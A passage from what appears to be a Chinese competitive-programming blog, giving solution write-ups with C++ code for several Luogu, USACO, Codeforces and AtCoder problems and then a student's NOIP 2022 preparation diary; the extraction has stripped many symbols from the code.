(.in,r,stdin); //freopen (.out,w,stdout); n = read (); for (int i = 1;i n;++i) int x = read (),y = read (),ty = read (); ve[x].push_back (y);co[x,y] = 0; ve[y].push_back (x);co[y,x] = ty; k = read (); for (int i = 1;i = k;++i) a[i] = read (); dfs (1,0); a[0] = pw[0] = 1; for (int i = 1;i = k;++i) pw[i] = pw[i - 1] * 2 % MOD; for (int i = 1;i = k;++i) int lca = getLCA (a[i],a[i - 1]); ++up[a[i - 1]];++down[a[i]];//up 加的位置为起点，down 加的位置为终点 --up[lca];--down[lca]; dfs (1,0); for (int u = 1;u = n;++u) for (auto v : ve[u]) // u - v 时不需花费 if (!co[v,u]) continue; //v - u 时此时需要花费 if (dep[u] dep[v]) ans = (ans + pw[up[v]] - 1 + MOD) % MOD; else ans = (ans + pw[down[u]] - 1 + MOD) % MOD; printf (%lld ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void dfs (int u,int fa) f[u][0] = fa;dep[u] = dep[fa] + 1; for (int i = 1;i = 18;++i) f[u][i] = f[f[u][i - 1]][i - 1]; for (auto v : ve[u]) if (v == fa) continue; dfs (v,u); up[u] += up[v];down[u] += down[v];//第二次 dfs 时才用到 （通过差分数组进行还原） 第一次 dfs 时值均为 0，所以没有影响 int getLCA (int x,int y) if (dep[x] dep[y]) swap (x,y); for (int i = 18;~i;--i) if (dep[f[x][i]] = dep[y]) x = f[x][i]; if (x == y) return x; for (int i = 18;~i;--i) if (f[x][i] != f[y][i]) x = f[x][i],y = f[y][i]; return f[x][0];","categories":["Solution"]},{"title":"题解：P8901 [USACO22DEC] Circular Barn S","path":"/2022/12/20/P8901/","content":"先考虑 $N = 1$ 的情况。若先手胜，我们称 $a_i$ 为必胜点，否则为必败点。显然 $1,2,3$ 均为必胜点；而 $4 = 1 + 3 = 2 + 2$，无论如何都是后手胜，所以为必败点。如果这时候你不知道如何去分析，可以尝试打出必败点的表（猜测必败点并不多），对于一个 $a_i$ 若无法拆分成质数或 $1$ 与另一个比它小的必败点的形式，那么这个 $a_i$ 便是必败点。 //x 为当前需要判断的数 p[1] = p[2] = p[3] = p[5] = p[7] = 1，以此类推ok = 0;for (auto i : lose) if (p[x - i]) ok = 1;//可以拆分if (!ok) lose.push_back (i)//说明是必败点 通过打表发现必败点都是 $4$ 的倍数。其实这很好理解，由于 $4$ 为最小的必败点，那么对于 $(4,8)$ 的数，都可以通过 $4 + 1,4 + 2,4 + 3$ 来表示，而 $8$ 只能表示成 $4$ 加上一个质数，显然不存在。那么以此类推，可知必败点为 $4k(k \\in N^*)$。 现在将问题还原，对于某一格的数，如果是必败点，那么先手会尽量拖延时间，也就是说选择数使其能够经过尽可能多的轮数；否则就会用尽可能少的轮数结束来赢得游戏。现在进行分类讨论： $a_i$ 为 $1$ 或质数，显然一轮就能结束； $a_i$ 为奇数，从第一个不大于它的质数（或 $1$，下同）开始判断，找到尽可能大的质数符合质数加上必败点的形式； $a_i$ 为偶数，无论是必胜还是必败点，每次都只会取 $2$。下面给出证明： $a_i$ 为必败点，先手会尽量拖延时间，取的数尽可能小，不难发现取 $2$ 会比取 $1$ 优。 $a_i$ 为必胜点，由于必败点为偶数，所以只能取 $2$ 这一个唯一的偶质数。 至此，取数的策略已经讲解完毕。所以只要找到若干轮后最先结束的 $a_i$，判断其是必胜点还是必败点即可。代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 5e5 + 5,M = 5e6 + 500;const int MOD = 1e9 + 7;inline int read ();int t,n,ok,times,cnt,a[MAX],vis[M + 5],p[MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); for (int i = 2;i = M;++i) if (!vis[i]) p[++cnt] = i; for (int j = 1;j = cnt;++j) if (i * p[j] M) break; vis[i * p[j]] = 1; if (i % p[j] == 0) break; p[0] = 1; t = read (); while (t--) n = read (); ok = 1;times = INF; for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = n;++i) if (a[i] % 2 == 0 times a[i] / 4) ok = (a[i] % 4 != 0),times = a[i] / 4; if (a[i] 1) int x = upper_bound (p,p + 1 + cnt,a[i]) - p - 1; while (~x) if ((a[i] - p[x]) % 4 == 0) if (times (a[i] - p[x]) / 4) ok = 1,times = (a[i] - p[x]) / 4; break; --x; puts (ok ? Farmer John : Farmer Nhoj); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：P3176 [HAOI2015]数字串拆分","path":"/2022/11/18/P3176/","content":"先处理函数 $f_i$，有 $f_i = \\sum \\limits _{j = i - m}^{i - 1} f_j$，这个递推式显然可以通过矩阵乘法进行优化。设 $F_i$ 表示通过递推函数 $f_i$ 得到的矩阵，则有以下矩阵的递推（以 $m = 5$ 为例）： F_i = \\begin{bmatrix} f_i\\\\ f_{i - 1}\\\\ f_{i - 2}\\\\ f_{i - 3}\\\\ f_{i -4} \\end {bmatrix} = \\begin{bmatrix} 1 & 1 & 1 & 1 & 1\\\\ 1 & 0 & 0 & 0 & 0\\\\ 0 & 1 & 0 & 0 & 0\\\\ 0 & 0 & 1 & 0 & 0\\\\ 0 & 0 & 0 & 1 & 0 \\end {bmatrix}^k \\cdot \\begin{bmatrix} f_{i - 1}\\\\ f_{i - 2}\\\\ f_{i - 3}\\\\ f_{i - 4}\\\\ f_{i - 5} \\end{bmatrix}$g_i$ 的计算不太好处理，等价转换以下令 $G_i$ 表示处理前 $i$ 位得到的所有情况的矩阵之和，因此最后的答案就会在 $G_n$ 中。由矩阵的乘法分配律可知 $A^{x + y} = A^x \\times A^y$，因此可以将 $G_i$ 进行转移。设 $A_{i,j}$ 表示数字串中 $[i,j]$ 的转移矩阵之积，则 $G_i = \\sum \\limits _{j = 0}^{i - 1} G_j \\times A_{j + 1,i}$。 现在的复杂度为计算矩阵 $A_{i,j}$，不难发现 $A_{i,j} = F_{s_i^{10^{n - i}}} \\times A_{i + 1,j}$，稍作变换得 $A_{i,j} = F_{({10^{n - i}})^{s_i}} \\times A_{i + 1,j}$。这样只需要预处理出 $F_{10^i}$ 的矩阵即可。 两个小细节： 在写矩阵时用到了 + 与 * 的重载，这时候原来的优先级已经不复存在，因此需要通过括号来处理顺序。 矩阵的初始化要小心，需要避免未定义行为。 代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 505;const int MOD = 998244353;int m,n;ll ans;char s[MAX]; struct Mat ll a[6][6]; Mat() memset(a,0,sizeof(a));//全部 memset 肯定没问题 Mat operator * (const Mat y) Mat z; for (int k = 1;k = m;++k) for (int i = 1;i = m;++i) for (int j = 1;j = m;++j) z.a[i][j] += a[i][k] * y.a[k][j] % MOD,z.a[i][j] %= MOD; return z; Mat operator + (const Mat y) Mat z; for (int i = 1;i = m;++i) for (int j = 1;j = m;++j) z.a[i][j] = a[i][j] + y.a[i][j],z.a[i][j] %= MOD; return z; Mat qpow (Mat x,ll y) Mat res; for (int i = 1;i = m;++i) res.a[i][i] = 1; while (y) if (y 1) res = res * x; x = x * x; y = 1; return res; p[MAX],f[MAX][MAX],g[MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); scanf (%s%d,s + 1,m); n = strlen (s + 1); for (int i = 1;i = m;++i) p[0].a[1][i] = 1; for (int i = 2;i = m;++i) p[0].a[i][i - 1] = 1; for (int i = 1;i = n;++i) p[i] = p[i].qpow (p[i - 1],10);//预处理 10^i 的矩阵 for (int j = 1;j = n;++j)//扩展 需要注意一下 i = j 的特殊情况 for (int i = j;i;--i)//f[i][j] = f[i + 1][j] * f(10^(j - i))^(s_i) f[i][j] = (i == j) ? f[i][j].qpow (p[0],s[i] - 0) : f[i + 1][j] * f[i][j].qpow (p[j - i],s[i] - 0); for (int i = 1;i = m;++i) g[0].a[i][i] = 1; for (int i = 1;i = n;++i)//g[i] 表示前 i 位的所有情况的答案 for (int j = 0;j i;++j) g[i] = g[i] + (g[j] * f[j + 1][i]);//注意优先级 printf (%lld ,g[n].a[1][1]);//最后的答案显然是左上角的那个值 return 0;","categories":["Solution"]},{"title":"题解：CF1650F Vitaly and Advanced Useless Algorithms","path":"/2022/11/17/CF1650F/","content":"有一个显然的贪心结论，就是先完成任务截止时间考前的，若在前面的都无法完成，那么后面的更加不可能完成。题目十分良心，$a_i$ 已经在输入时升序给出。 对于每个任务，需要用尽可能少地耗时完成尽可能多的百分比，每个计划的状态均为选或不选，这不就是 $0-1$ 背包嘛。由于要输出方案，所以我们设二维状态，对于某个任务，设 $dp_{i,j}$ 表示该任务的前 $i$ 个计划完成的百分率为 $j$ 时的最小耗时，这里默认 $j 100$ 时也表示成 $j = 100$ 的状态。所以可以写成方程 $dp_{i,j}(j \\le [1,100]) = \\min (dp_{i - 1,j},\\min \\{dp_{i - 1,j - p} + t\\})$，其中有一个是继承上一次的状态。 对于每个任务的方案记录，直接从 $dp_{i,100}$ 进行还原，若 $dp_{i,j} ≠ dp_{i - 1,j}$ 则说明发生有效转移，记录此时的计划编号即可。用一个 vector 去记录会比较遍历，每一次 $dp$ 后将每个人物的方案汇总至总的方案数组即可。 思路不算复杂，不过需要注意 $dp$，方案记录数组的初始化以及无解的判断。代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#include vector#define init(x) memset (x,INF,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();struct node int id,t,p;;int t,n,m,ok,sum,a[MAX],dp[MAX][105];vector int ans,v;vector node e[MAX];int solve (int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read ();m = read ();ok = 1;sum = 0;ans.clear (); for (int i = 1;i = n;++i) a[i] = read (); for (int i = 1;i = m;++i) int x = read (),ti = read (),pi = read (); e[x].push_back (i,ti,pi); for (int i = 1;i = n;++i) int x = solve (i); if (x == -1 || sum + x a[i])ok = 0;break;//时间不够 sum += x; for (auto j : v) ans.push_back (j);//答案的汇总 if (!ok) puts (-1); else printf (%d ,ans.size ()); for (auto i : ans) printf (%d ,i); puts (); for (int i = 1;i = n;++i) e[i].clear (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;int solve (int x) int k = e[x].size (); for (int i = 0;i = k;++i) for (int j = 0;j = 100;++j) dp[i][j] = INF; v.clear (); dp[0][0] = 0;//初始化 for (int i = 1;i = k;++i) node nw = e[x][i - 1];//注意 vector 的下标存储 for (int j = 100;~j;--j) dp[i][j] = min (dp[i][j],dp[i - 1][max (0,j - nw.p)] + nw.t),dp[i][j] = min (dp[i - 1][j],dp[i][j]); if (dp[k][100] == INF) return -1;//无法完成任务 int p = k,cnt = 100; while (p cnt 0) if (dp[p][cnt] == dp[p - 1][cnt]) --p;continue;//说明并没有发生有效转移 v.push_back (e[x][p - 1].id);//记录编号 cnt -= e[x][p - 1].p; --p; return dp[k][100];//最小时间","categories":["Solution"]},{"title":"题解：CF1749F Distance to the Path","path":"/2022/11/14/CF1749F/","content":"部分参考了 这篇 xianggl巨佬的博客。 由于 $d \\le 20$，考虑将不等关系的信息存放在数组中，转换为最大距离 $d$ 时的信息。考虑单独处理每一个点时，直接暴力修改与某一点 $x$ 距离为 $[0,d]$ 的点，此时不难分析出时间复杂度为 $O(qnd)$。 由于是区间更新，需要同时更新 $x \\to y$ 这条链上的点，也就是提示要用数据结构去维护。将单点数据的处理分为子树内与子树外两种情况进行分类讨论。 对于在子树内的点，倘若是一段连续的区间，则可以利用数据结构一次更新完毕。不难想到利用树链剖分维护 $\\texttt{dfs}$ 序，这样子树内的 $\\texttt{dfs}$ 序便是连续的。利用常数较小的树状数组，设 $c_{i,j}$ 存的是最大距离为 $i$ 时每一个点产生的贡献。则在一次处理时直接更新 $x,y,\\rm{LCA(x,y)}$ 三点即可，也就是 modify (c[d],x,k);modify (c[d],y,k);modify (c[d],LCA(x,y),-2 * k)，其中 modify 函数即为树状数组的操作。用 in[x] 和 out[x] 分别表示第一次和最后一次经过 $x$ 点时的 $\\texttt{dfs}$ 序，因此在查询答案时子树内的贡献即用差分的思想进行树状数组维护操作。 对于在子树外的点，显然都可以归结到 $z = \\rm LCA(x,y)$ 这一点产生的贡献。由于是单点，直接进行暴力修改。设 $dp_{i,j}$ 表示以 $i$ 为根距离为 $j$ 时的贡献的权值。从 $z$ 开始向上走，$z$ 对上面距离不超过 $j$ 的节点产生影响，然后发现，$z$ 的父亲会对距离不超过 $j - 2$ 的节点产生的影响被重复计算，直接进行容斥即可（需要减去的条件是距离超过 $j - 2$ 且 $z$ 上方还存在节点）。 综上分析，子树内修改为 $O(q\\log n)$，查询为 $O(qd \\log n)$；子树外修改为 $O(qd)$，查询为 $(qd)$，由于 $n,q$ 同阶，$d,\\log n$ 大小相近，所以最后的时间复杂度为 $O(n \\log^2 n)$。 代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#include vector#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define lowbit(x) x (-x)using namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,m,cnt,in[MAX],out[MAX],top[MAX],sz[MAX],hson[MAX],f[MAX],dep[MAX],dp[MAX][25],c[25][MAX]; vector int ve[MAX];void dfs1 (int u,int fa);void dfs2 (int u,int fa);int lca (int u,int v);void modify (int tr[],int x,int v);int query (int tr[],int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (); for (int i = 1;i n;++i) int x = read (),y = read (); ve[x].push_back (y);ve[y].push_back (x); dfs1 (1,0); in[1] = ++cnt,top[1] = 1; dfs2 (1,0); //for (int i = 1;i = n;++i) coutin[i] out[i]endl; m = read (); for (int i = 1;i = m;++i) int ty = read (); if (ty == 1) int x = read (),ans = 0,p = 0; for (int i = 0;i = 20;++i) ans += query (c[i],out[x]) - query (c[i],in[x] - 1);//差分思想 for (int j = p;j = 20;++j) ans += dp[x][j];//每向上走一次，距离至少为 p ++p;x = f[x]; if (!x) break;//向上面已经没有节点就停止 printf (%d ,ans); else int u = read (),v = read (),k = read (),d = read (); int z = lca (u,v); modify (c[d],in[u],k);modify (c[d],in[v],k);modify (c[d],in[z],-2 * k);//重复部分的去除 for (int i = d;~i;--i) dp[z][i] += k; if (i - 2 = 0 f[z]) dp[z][i - 2] -= k;//容斥 距离 = i - 2 且 z 上还有节点 z = f[z]; if (!z) break; return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void dfs1 (int u,int fa)//树链剖分 dep[u] = dep[fa] + 1; f[u] = fa;sz[u] = 1; for (auto v : ve[u]) if (v == fa) continue; dfs1 (v,u); sz[u] += sz[v]; if (sz[v] sz[hson[u]]) hson[u] = v; void dfs2 (int u,int fa) if (hson[u]) in[hson[u]] = ++cnt;//dfs 序 top[hson[u]] = top[u]; dfs2 (hson[u],u); for (auto v : ve[u]) if (top[v]) continue; in[v] = ++cnt; top[v] = v; dfs2 (v,v); out[u] = cnt;//dfs 序int lca (int u,int v)//树链剖分求 LCA int fx = top[u],fy = top[v]; while (fx != fy) if (dep[fx] dep[fy]) swap (fx,fy),swap (u,v); u = f[fx],fx = top[u]; if (dep[u] dep[v]) swap (u,v); return u;void modify (int tr[],int x,int v) for (int i = x;i = n;i += lowbit (i)) tr[i] += v;int query (int tr[],int x) int sum = 0;for (int i = x;i;i -= lowbit (i)) sum += tr[i];return sum;//树状数组基本操作","categories":["Solution"]},{"title":"题解：[ABC274D] Robot Arms 2","path":"/2022/10/23/ABC274D/","content":"首先提醒一下不要读错题目，因为题目并没有要求旋转 $90$ 度是顺时针还是逆时针。 将 $dx,dy$ 分开考虑，题目转换为 $dx = A_1,dy = 0$，然后 $A_{2i + 1},A_{2i} (i 0)$ 分别对 $dx,dy$ 产生影响，问能否凑成题目所求的数 $(x,y)$。尝试 $\\texttt{dp}$，若某一维的 $x$ 可以得到，那么对于本轮的 $A$，可以得到 $x - A$ 与 $x + A$，转移的时候直接枚举上一轮所有被标记的位置即可。为了方便负数的操作，直接使用 map 存储。 代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#include map#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e3 + 5;const int MOD = 1e9 + 7;inline int read ();int n,x,y,dx,dy,a[MAX];map int,int dpx[MAX],dpy[MAX];int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();x = read ();y = read (); for (int i = 1;i = n;++i) a[i] = read (); //坐标x y 分开考虑 dpx[1][a[1]] = 1;//初始化 for (int i = 3;i = n;i += 2) for (auto j : dpx[i - 2])//由上一轮得到的数进行转移 dpx[i][j.first + a[i]] = dpx[i][j.first - a[i]] = 1; dpy[0][0] = 1;//初始化 for (int i = 2;i = n;i += 2) for (auto j : dpy[i - 2]) dpy[i][j.first + a[i]] = dpy[i][j.first - a[i]] = 1; if (dpx[(n 1) ? n : n - 1].count (x) dpy[(n 1) ? n - 1 : n].count (y)) puts (Yes); else puts (No); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"2022 NOIP 备赛记","path":"/2022/10/04/NOIP2022/","content":"前言已经高二了，依旧是蒟蒻。应该是最后一次比赛了，所以打算拼一把。 就从国庆这一天开始写起吧。没啥逻辑，想到啥就说点啥，也算是记录一下一个信竞生的日常吧。 $\\texttt{2022.10.01}$大概是开始零碎的复习了。 先从树链剖分入手，大概是每天码一题的样子，但是弱智的错误还是接连不断。什么询问下标没用改成 $\\texttt{dfn}$ 序啊，深搜写的时候忘记更新重儿子导致剖分了个寂寞啊等等问题是层出不穷。大概把剖分的基础题差不多写了一遍。 树链剖分往往和线段树相结合，所以说下标的问题要值得注意，因为剖分大多依赖的是 $\\texttt{dfs}$ 后的 $\\texttt{dfn}$ 序。在写询问的时候，总是记不清楚 if (dep[fx] dep[fy]) swap (fx,fy),swap (x,y); 这个交换的顺序，认真的理解了一下，现在应该能明白了。while (fx != fy) 循环里的交换，默认 $x$ 的深度大于 $y$，所以是让 $x$ 向上跳；而循环外的最后一次交换，由于已经找到了最近公共祖先，所以方便编写我们让 $x$ 成为深度较小的那个，从而进行线段树上的操作（线段树的更新中编号小的显然 $\\texttt{dfn}$ 序小，也就是深度小）。 做题时遇到一类需要进行与边权相关的操作的题目，有一个比较好的处理技巧—就是把边权转到深度较大的点上。考虑一下正确性，每一条边都被两个点相连，所以一定能通过这种方式将边权全部进行转化，而每一个点的深度在第一个 $\\texttt{dfs}$ 中已经记录，所以也不需要增加过多的代码。不过在查询的时候，需要注意的就是 $\\texttt{LCA}$ 那个点所存的边相当于是其上方的边，在询问是并不会经过，因此在查询时最后一次更新写成 modify (1,1,n,dfn[x] + 1,dfn[y]) 就能完美的解决这个问题。原因很简单，由树链剖分求 $\\texttt{LCA}$ 可知，最后的那个 $x$ 就是最近公共祖先，又由于重儿子优先的原则，子树内所有的点的 $\\texttt{dfn}$ 是连续的，所以直接把这个点去掉即可。 习题列表： P4114 Qtree1 同 QTREE - Query on a tree 边权转点权，单点更新，区间查询。 P4315 月下“毛景树” 边权转点权，区间更新，区间查询。 P3038 [USACO11DEC]Grass Planting G 同 SP12005 GRASSPLA - Grass Planting 边权转点权，区间更新，单点查询。 P3178 [HAOI2015]树上操作 区间更新，区间查询。 P3833 [SHOI2012]魔法树 区间更新，区间查询。 CF343D Water Tree 区间更新，单点查询。 CF165D Beard Graph 单点更新，区间查询，最近公共祖先。 P3950 部落冲突 单点更新，区间查询，最近公共祖先。 P4116 Qtree3 轻重链剖分，set。 $\\texttt{2022.10.05}$数位 $\\texttt{dp}$ 的一些中等题先写起来，这种题目大多都有套路，一般用记忆化来写。给个最简单的模板： ll dfs (int pos,bool limit,bool lead) if (pos cnt) return 条件; if (!limit ~dp[pos][sth.]) return dp[pos][sth.]; int res = limit ? a[cnt - pos + 1] : 9;ll sum = 0; for (int i = 0;i = res;++i) sum += dfs (pos + 1,(i == res) limit,(i == 0) lead); if (!limit) dp[pos][sth.] = sum; return sum; 一类题目可以直接进行记忆化，而一类题目需要通过合理的状态设计从而将其进行转移并记录。 习题列表： P4127 [AHOI2009]同类分布 枚举各位数之和来充当模数，从而进行记忆化。 P4317 花神的数论题 枚举二进制数中 $1$ 的个数，设 $f[i]$ 表示有 $i$ 个 $1$ 的数的个数，之后根据乘法原理用快速幂求解。 P6218 [USACO06NOV] Round Numbers S 记录 $0$ 与 $1$ 的个数到达边界时进行比较即可。 P4124 [CQOI2016]手机号码 记录前两位数以及不能出现的数这四个信息。注意前导零的处理，可以直接循环枚举第一位然后再去搜索，同时需要判断位数（$L = 10^{10}$ 时，$L - 1$ 的位数便不再符合）。 $\\texttt{2022.10.09}$国庆回来竟然就要月考，一通乱考，晚上还是来机房刷题。接着回到数据结构，再来看看树状数组。 说到树状数组，总是会与逆序对联系在一起，毕竟太经典了。同时，树状数组的题目往往伴随着离散化（要不就 $\\texttt{MLE}$ 了嘛）。弄清楚树状数组哪里需要 +1 或 -1，估计也就没什么大的问题了。 一般来说，查询 query (x) 表示求小于等于 $x$ 的数相关的内容，所以求小于时需要 -1。又因为树状数组的区间查询是基于差分的思想，要减去左端点之前的部分，所以说也要 -1。似乎最常见的情况就只有这么多，先写这些吧。 由于线段树与树状数组都比较常考，接下来几天里，就做做有关的题目吧。 习题列表： P6186 [NOI Online #1 提高组] 冒泡排序 与逆序对相结合，记录 $k[i]$ 表示逆序对数为 $x$ 的位置的个数，然后通过找规律发现 $c$ 轮的排序会少 $\\sum_{i = 1}^{c} k[i]$ 个逆序对，最后通过树状数组维护每次操作产生的影响。 P3586 [POI2015] LOG 通过找规律发现要维护的是 $\\ge s$ 的数的个数以及 $ s$ 的数的和。需要离散化，所以如果是在线操作的话应该用平衡树去维护。 P4054 [JSOI2009] 计数问题 二维树状数组，写起来和一位的差不多，同时再多开一维数组记录颜色的信息，查询的时候用差分的思想去解决问题即可。单点修改，区间查询。 P4514 上帝造题的七分钟 区间修改，区间查询。令 $d[i] = a[i] - a[i - 1]$，则有 $\\sum_{i = 1}^{k} d[k] = a[k]$，修改时分别处理 $l$ 与 $r + 1$ 即可。同样的，扩展到二维时，二维前缀和变为 $\\sum \\limits_{i = 1}^{x}\\sum\\limits_{j = 1}^{y}\\sum\\limits_{k = 1}^{i}\\sum\\limits_{l = 1}^{j} d[k][l] = \\sum \\limits_{i = 1}^{x}\\sum\\limits_{j = 1}^{y} d[i][j] \\times (x - i + 1)(y - j + 1) = \\sum \\limits_{i = 1}^{x}\\sum\\limits_{j = 1}^{y} (x +1)(y + 1)\\times d[i][j] + (x + 1)j\\times d[i][j] - (y + 1)i\\times d[i][j] + ij \\times d[i][j]$。因此开四个树状数组分别维护这四个信息，最后还原差分序列即可。 P1637 三元上升子序列 比较简单的一道题，遍历中间的那个数字，然后正反两边循环分别用树状数组维护比其大（小）的数的个数，根据乘法原理得出答案。 P3605 [USACO17JAN]Promotion Counting P 容易想到退化成链时变为求逆序对的个数。类似的，离散化之后用树状数组维护比某一节点大的数的个数，用 dfs 前后的值作差得到答案。 UVA12983 The Battle of Chibi 同 CF597C Subsequences 不难想到 $O(kn^2)$ 的朴素 $\\texttt{DP}$，$dp_{i,j}$ 表示前 $i$ 个数中以 $i$ 结尾的且长度为 $j$ 的严格上升序列。然后发现 $dp_{i,j}$ 会由 $dp_{i,j - 1}$ 得到，因此可以用数据结构优化 $\\texttt{DP}$。对于第 $i$ 个数，需要找到比它小且在它前面的节点，不难想到使用树状数组维护。同时，可以用滚动数组优化空间，得到最后的时间复杂度为 $O(kn \\log n)$ 的代码。 P5200 [USACO19JAN]Sleepy Cow Sorting G 不错的思维题。手模就能发现，最少的数目是倒序第一个出现 $a_i a_{i + 1}$ 的 $i$，相当于 $i$ 之后的都已经有序，不需要移动。输出方案时，由于需要移到有序数组中的某一位置，因此需要知道移动时比它小的数的个数，用树状数组维护，对于每一个移动的量，答案为 k - i + query (a[i] - 1)。 P3582 [POI2015] KIN 由于不能某个数多次出现，则不能累加它的贡献。考虑枚举并记录每种数上一个数出现的位置，如果一种数两次出现，那么我们就把上一次的位置修改成其相反数从而抵消贡献;如果大于两次，显然不能多减去贡献，那么把上一个位置之前的全部变为 $0$ 即可。于是题目就转换成了区间最大子段和，线段树维护左右子树的最大子段和，区间和，最大子段和即可。 $\\texttt{2022.10.16}$$\\texttt{OI}$ 赛制的模拟赛，然后因为两个弱智错误，导致 $300\\texttt{ pts} \\to 100 \\texttt{ pts}$。 $\\texttt{T1}$ 属于是无脑模拟，确定 $n$ 个化学方程式中的每一个化学方程式是否平衡，然后加了一堆便于操作而产生的条件。一开始写乱了，后来果断重构，写成函数，然后一发过样例，就没管它了。 $\\texttt{T2}$ $60\\texttt{ pts}$ 的部分分一眼秒，属于是二维前缀和优化求最大值，时间复杂度为 $O(n^4)$。然后考虑优化，容易想到固定 $x_1,y_1,x_2$ 时，$y_2$ 的枚举是可以一直往一个方向扫的，因此考虑尺取法。 考虑一个结论，令一个矩形的价格之和为 $s$，若 $s \\in [a,b]$，画一下数轴可知此时是最优解，而 $s$ 如果在这个区间之外，则需要尽量的靠近这个区间。 所以尺取法以 $\\lt a$ 和 $b$ 为边界，正反扫两次，由于每个数最多被扫一次，所以时间复杂度为 $O(n^3)$，常数不大，可以通过此题。 我不会说赛时因为自己 sb，只判断了两个极值然后写挂的。 $\\texttt{T3}$ 贪心可知找到距离最近的一个电梯然后向上走即可，于是题目转化为求距离 $x$ 最近的电梯。不难想到用线段树（求区间最大值）与二分维护，似乎直接线段树二分也行，复杂度还能少个 $\\log$，之后直接求两点的劣弧的距离即可（笑死，赛时这里写挂了）。 由于成环的特性，直接进行线段树操作并不方便，考虑开三倍的数组 $x,x + n,x + 2 \\times n$ 均维护同一个位置，这样前后走的时候就方便处理了。 最后在 query 的时候加了个优化，如果左区间返回非零值就可以直接结束，这样刚好能够使 $O(n \\log ^2 n)$ 大常数的线段树过了这道题。 【updated】 发现题解写了一个记忆化搜索就过了，我敲！ $\\texttt{T4}$ 看了题解好像也不麻烦，看来对 $\\texttt{dp}$ 的状态设计能力还需要加强。由于交换顺序不会产生影响，设 $dp_{0/1,i,j,k}$ 决定了区间外的最左/右的 $i$ 个娃娃，区间内的最左/右的 $j$ 个娃娃，代价为 $k$ 时最大的减少量，转移时 $dp_{0/1,i,j,k} = \\max (dp_{0/1,i - 1,j,k},dp_{0/1,i,j - 1,k},dp_{0/1,i - 1,j - 1,k - abs (l - r)} + W)$。从区间的左右分别选择做两次 $\\texttt{dp}$，然后枚举断点进行合并。 由于$i$ 这一维可以滚动数组优化，所以总时间复杂度 $O(n^2k)$，空间复杂度 $O(nk)$。当然，$k$ 大于一定值时，答案一定为前 $r - l + 1$ 小的值的和，所以也可以进行空间上的再次优化，不过不加也可以通过此题。 总的来说，这场模拟赛难度不大，但是却需要足够的细致才能一次写对，继续加油吧！ $\\texttt{2022.10.18}$开始状态压缩 $\\texttt{dp}$ 的复习。 P3694 邦邦的大合唱站队 由于 $m$ 的数据范围极小，所以设 $dp_i$ 表示在 $i$ 状态小的最小出队人数即可。 P2704 [NOI2001] 炮兵阵地 首先预处理同行都情况，把合法的状态进行储存。之后处理列的情况，需要满足列也不冲突，因此状态中要加入前一行，枚举时需要从上两行开始处理。前两行比较特殊需要分开处理。 P2831 [NOIP2016 提高组] 愤怒的小鸟 预处理出两个点能构成的所有 $c = 0$ 的二次函数，记录一次二次项系数即可，然后将所有过某抛物线的猪放入一个状态中。转移时每次加入一条抛物线更新状态，当然要注意某抛物线只过一点的特殊情况。实现起来有一定的细节，需要注意 $a 0$。 P3092 [USACO13NOV]No Change G 枚举各枚硬币的使用状态，然后转移时通过二分找到上一次的购买的物品。 $\\texttt{2022.10.21}$又是模拟赛。 $\\texttt{A}$ 和模拟差不多，直接用 set 水过去了。 然后 $\\texttt{B}$ 一开始没想法，先去看了 $\\texttt{C}$。发现是贪心，按三种属性分别从大到小排序后枚举后，判断第一对合法的三个人组成一组，然后输出即可。 写完 $\\texttt{C}$ 以后接着看 $\\texttt{B}$，发现又是可以用 set 维护，一直往右扫，如果能解题目就解，否则弹出最大值来换（前提是更优的情况下）。写完用暴力拍了一下不对，然后发现要用 multiset，继续拍还是不对，然后就寄了。赛后发现是 erase 函数错了，不能写成 s.erase(*(--s.end())，因为这样会把所有一样的值全都删除。赛后改写成 s.erase (--s.end()) 就过了（这样的话删的是末尾的地址指向的值，因此只会删除一个数）。 $\\texttt{D}$ 因为模拟赛时间与吃饭冲突，所以就没写。赛后发现是个神必模拟，加个优先队列，按楼层高低为关键字排就过了。 $\\texttt{2022.10.22}$晚上打了 $\\texttt{Atcoder}$，意外的是得知 $\\texttt{G}$ 重题直接水过去了。另外 $\\texttt{D E}$ 